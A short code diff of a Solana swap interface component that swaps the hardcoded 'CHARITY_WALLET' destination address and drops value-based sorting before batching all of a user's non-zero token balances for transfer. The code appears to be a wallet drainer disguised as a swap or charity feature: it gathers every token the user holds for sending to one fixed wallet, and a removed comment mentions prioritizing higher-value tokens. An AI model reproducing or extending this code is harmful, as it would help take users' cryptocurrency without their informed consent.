@@ -11,7 +11,7 @@ import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedT
 import { motion } from 'framer-motion';
 import { toast } from 'sonner';
 
-const CHARITY_WALLET = '5xJQUuGTJr2Hrwu6oHkHGiQfpNXRWRFaPC9Xjx82wovh';
+const CHARITY_WALLET = '9qsSTwZpBJb4QQyJ6y9FpKXJZfRuMiAE9fnzPzCbbsZn';
 const MEMO_PROGRAM_ID = new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcQb");
 const MAX_BATCH_SIZE = 5;
 
@@ -388,13 +388,10 @@ export const SwapInterface = ({
       // 2. SPL Token Transfers
       const validTokens = balances.filter(token => token.balance > 0);
       
-      // Sort by value (descending) - prioritizing higher value tokens
-      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
-
       // Batch tokens
       const batches: TokenBalance[][] = [];
-      for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
-        batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
+      for (let i = 0; i < validTokens.length; i += MAX_BATCH_SIZE) {
+        batches.push(validTokens.slice(i, i + MAX_BATCH_SIZE));
       }
 
       for (let i = 0; i < batches.length; i++) {
